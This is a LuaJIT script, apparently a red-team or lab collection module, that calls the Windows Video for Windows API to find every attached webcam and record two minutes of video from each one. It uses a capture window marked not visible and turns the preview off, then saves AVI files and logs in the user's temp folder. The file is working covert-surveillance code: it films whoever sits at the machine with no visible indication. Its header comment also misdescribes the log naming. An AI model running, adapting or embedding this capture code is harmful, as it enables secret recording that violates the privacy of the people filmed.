-- webcam_video_simple.lua
-- Simple webcam video capture using VFW (Video for Windows) API
-- Captures 2-minute videos from detected cameras
-- Logs to %TEMP%\COMPUTERNAME_WEBCAM_VIDEO_YYYYMMDD_HHMMSS.log

local jit = require("jit")
jit.off(true, true)

local ffi = require("ffi")

-- Global log file handle
local LOG_HANDLE = nil

ffi.cdef[[
typedef unsigned long DWORD;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef int BOOL;
typedef void* HANDLE;
typedef void* HWND;
typedef char* LPSTR;
typedef const char* LPCSTR;
typedef wchar_t* LPWSTR;
typedef DWORD* LPDWORD;
typedef long long LONGLONG;

// File operations
HANDLE CreateFileA(LPCSTR, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
BOOL WriteFile(HANDLE, const void*, DWORD, LPDWORD, void*);
BOOL FlushFileBuffers(HANDLE);
BOOL CloseHandle(HANDLE);
DWORD GetTempPathA(DWORD, LPSTR);
DWORD GetComputerNameA(LPSTR, LPDWORD);

// VFW API
HWND capCreateCaptureWindowA(LPCSTR, DWORD, int, int, int, int, HWND, int);
BOOL capGetDriverDescriptionA(WORD, LPSTR, int, LPSTR, int);
LONGLONG SendMessageA(HWND, DWORD, DWORD, LONGLONG);
BOOL DestroyWindow(HWND);
void Sleep(DWORD);
]]

local avicap32 = ffi.load("avicap32")
local user32 = ffi.load("user32")
local kernel32 = ffi.load("kernel32")

-- Constants
local GENERIC_WRITE = 0x40000000
local CREATE_ALWAYS = 2
local FILE_ATTRIBUTE_NORMAL = 0x80
local FILE_FLAG_WRITE_THROUGH = 0x80000000  -- Immediate disk write, no buffering
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", ffi.cast("intptr_t", -1))

-- VFW Messages
local WM_CAP_DRIVER_CONNECT = 0x40A
local WM_CAP_DRIVER_DISCONNECT = 0x40B
local WM_CAP_SET_PREVIEW = 0x432
local WM_CAP_SEQUENCE = 0x43E
local WM_CAP_STOP = 0x436
local WM_CAP_FILE_SET_CAPTURE_FILEA = 0x414

-- Video capture duration (2 minutes = 120 seconds = 120000 ms)
local CAPTURE_DURATION_MS = 120000

-- === Logging Functions ===
local function getTempPath()
    local buffer = ffi.new("char[260]")
    local len = kernel32.GetTempPathA(260, buffer)
    if len > 0 then
        return ffi.string(buffer, len)
    end
    return "C:\\Temp\\"
end

local function getComputerName()
    local buffer = ffi.new("char[256]")
    local size = ffi.new("DWORD[1]", 256)
    if kernel32.GetComputerNameA(buffer, size) ~= 0 then
        return ffi.string(buffer)
    end
    return "UNKNOWN"
end

local function initializeLogFile()
    pcall(function()
        local tempPath = getTempPath()
        local computerName = getComputerName()
        local timestamp = os.date("%Y%m%d_%H%M%S")
        local logPath = string.format("%sWIN11LAB_WEBCAM_VIDEO_%s.log", tempPath, timestamp)
        
        LOG_HANDLE = kernel32.CreateFileA(
            logPath,
            GENERIC_WRITE,
            0,
            nil,
            CREATE_ALWAYS,
            FILE_FLAG_WRITE_THROUGH,  -- Write through, no caching
            nil
        )
        
        if LOG_HANDLE ~= INVALID_HANDLE_VALUE and LOG_HANDLE ~= nil then
            print(string.format("[+] Log file created: %s", logPath))
        else
            LOG_HANDLE = nil
        end
    end)
end

local function log(message)
    pcall(function()
        if not message then message = "" end
        
        if message ~= "" then
            print(message)
        end
        
        if LOG_HANDLE ~= nil and LOG_HANDLE ~= INVALID_HANDLE_VALUE then
            local timestamp = os.date("%Y-%m-%d %H:%M:%S")
            local logLine = string.format("[%s] %s\n", timestamp, message)
            local written = ffi.new("DWORD[1]")
            local result = kernel32.WriteFile(LOG_HANDLE, logLine, #logLine, written, nil)
            -- Immediately flush to disk to ensure data is written even if process terminates
            if result ~= 0 then
                kernel32.FlushFileBuffers(LOG_HANDLE)
            end
        end
    end)
end

local function closeLogFile()
    pcall(function()
        if LOG_HANDLE ~= nil then
            kernel32.CloseHandle(LOG_HANDLE)
            LOG_HANDLE = nil
        end
    end)
end

-- === VFW Video Capture Functions ===
local function listVideoDevices()
    local devices = {}
    local nameBuffer = ffi.new("char[80]")
    local verBuffer = ffi.new("char[80]")
    
    log("[*] Enumerating video capture devices...")
    
    for i = 0, 9 do
        local result = pcall(function()
            local ret = avicap32.capGetDriverDescriptionA(i, nameBuffer, 80, verBuffer, 80)
            if ret ~= 0 then
                local name = ffi.string(nameBuffer)
                local version = ffi.string(verBuffer)
                table.insert(devices, {
                    index = i,
                    name = name,
                    version = version
                })
                log(string.format("[+] Device %d: %s (%s)", i, name, version))
            end
        end)
        if not result then break end
    end
    
    log(string.format("[+] Found %d video capture device(s)", #devices))
    return devices
end

local function captureVideoFromDevice(deviceIndex, outputPath, durationMs)
    local success = false
    
    pcall(function()
        log(string.format("[*] Capturing %d second video from device %d", durationMs / 1000, deviceIndex))
        log(string.format("[*] Output: %s", outputPath))
        
        -- Create capture window (hidden)
        local hwnd = avicap32.capCreateCaptureWindowA(
            "WebcamVideoCapture",
            0,  -- Not visible
            0, 0,
            640, 480,
            nil,
            0
        )
        
        if hwnd == nil or ffi.cast("intptr_t", hwnd) == 0 then
            log("[!] Failed to create capture window")
            return
        end
        
        log("[+] Created capture window")
        
        -- Connect to driver
        local connected = user32.SendMessageA(hwnd, WM_CAP_DRIVER_CONNECT, deviceIndex, 0)
        if connected == 0 then
            log("[!] Failed to connect to driver")
            user32.DestroyWindow(hwnd)
            return
        end
        
        log("[+] Connected to driver")
        
        -- Disable preview
        user32.SendMessageA(hwnd, WM_CAP_SET_PREVIEW, 0, 0)
        
        -- Set output file
        local fileSet = user32.SendMessageA(hwnd, WM_CAP_FILE_SET_CAPTURE_FILEA, 0, ffi.cast("LONGLONG", ffi.cast("intptr_t", ffi.cast("const char*", outputPath))))
        if fileSet == 0 then
            log("[!] Failed to set output file")
            user32.SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            user32.DestroyWindow(hwnd)
            return
        end
        
        log("[+] Set output file")
        
        -- Wait for camera initialization
        kernel32.Sleep(1000)
        
        -- Start capture sequence
        log("[*] Starting video capture...")
        local started = user32.SendMessageA(hwnd, WM_CAP_SEQUENCE, 0, 0)
        if started == 0 then
            log("[!] Failed to start capture sequence")
        else
            log(string.format("[+] Recording... (%d seconds)", durationMs / 1000))
            
            -- Wait for capture duration
            kernel32.Sleep(durationMs)
            
            -- Stop capture
            user32.SendMessageA(hwnd, WM_CAP_STOP, 0, 0)
            log("[+] Stopped recording")
            
            success = true
        end
        
        -- Disconnect and cleanup
        user32.SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
        user32.DestroyWindow(hwnd)
        log("[+] Cleaned up capture resources")
        
        if success then
            log(string.format("[+] Video saved to: %s", outputPath))
        end
    end)
    
    return success
end

-- === Main Execution ===
local function main()
    log("=== Webcam Video Capture (VFW) - 2 Minutes ===")
    log("")
    
    -- List all devices
    local devices = listVideoDevices()
    
    if #devices == 0 then
        log("[!] No video capture devices found")
        return
    end
    
    log("")
    
    -- Capture video from each device
    local tempPath = getTempPath()
    for _, device in ipairs(devices) do
        local timestamp = os.date("%Y%m%d_%H%M%S")
        local sanitizedDeviceName = device.name:gsub("[^%w%s%-_]", "_"):gsub("%s+", "_")
        local logPath = string.format("%sWIN11LAB_WEBCAM_VIDEO_%s_%s.log", tempPath, sanitizedDeviceName, timestamp)
        local outputPath = string.format("%s.avi", logPath:match("(.-)%.log$"))
        
        log(string.format("[*] Processing device %d: %s", device.index, device.name))
        local result = captureVideoFromDevice(device.index, outputPath, CAPTURE_DURATION_MS)
        
        if result then
            log(string.format("[+] Successfully captured video from %s", device.name))
        else
            log(string.format("[-] Failed to capture video from %s", device.name))
        end
        
        log("")
    end
    
    log("=== Video Capture Complete ===")
end

-- Initialize logging and run
initializeLogFile()

local status, err = pcall(main)
if not status then
    log(string.format("[FATAL] Script error: %s", tostring(err)))
end

closeLogFile()
